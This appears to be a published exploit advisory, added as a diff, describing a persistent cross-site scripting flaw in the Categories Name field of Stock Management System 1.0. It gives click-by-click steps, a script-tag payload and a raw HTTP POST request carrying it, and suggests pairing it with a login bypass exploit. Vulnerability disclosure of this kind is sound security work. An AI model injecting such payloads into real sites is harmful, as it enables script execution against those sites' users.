@@ -1,0 +1,47 @@
+# Exploit Title: Stock Management System 1.0 - Persistent Cross-Site Scripting (Categories Name)
+# Exploit Author: Adeeb Shah (@hyd3sec)
+# Date: August 2, 2020
+# Vendor Homepage: https://www.sourcecodester.com/
+# Software Link: https://www.sourcecodester.com/php/14366/stock-management-system-php.html
+# Version: 1.0
+# Tested On: Windows 10 (x64_86) + XAMPP 7.4.4
+
+
+# Vulnerability Details
+# Description A persistent cross-site scripting vulnerability exists within the 'Categories Name' parameter in the edit brand function.
+# This example allows a logged-in user to inject javascript code as a persistent XSS attack which is persistent on any page with the Categories Name value expected.
+
+#Steps:
+
+	1. Log in with admin privileges (use credentials or use the Auth Login Bypass exploit)
+
+	2. Click "Category"
+
+	3. Click "Action" in any categories name row
+
+	4. Click Edit
+
+	5. In "Categories Name" field enter XSS <script>alert("XSS")</script>
+
+	6. Click save changes
+
+	7. Any page on the webapp expecting that 'Categories Name' will trigger the XSS.
+
+POST /stock/php_action/editCategories.php HTTP/1.1
+Host: 192.168.222.132
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.222.132/stock/categories.php
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 102
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=1halobmiaq86oi70ogliu0qlh8
+
+
+
+
+editCategoriesName=%3Cscript%3Ealert(%22hyd3sec%22)%3C%2Fscript%3E&editCategoriesStatus=1&editCategoriesId=9
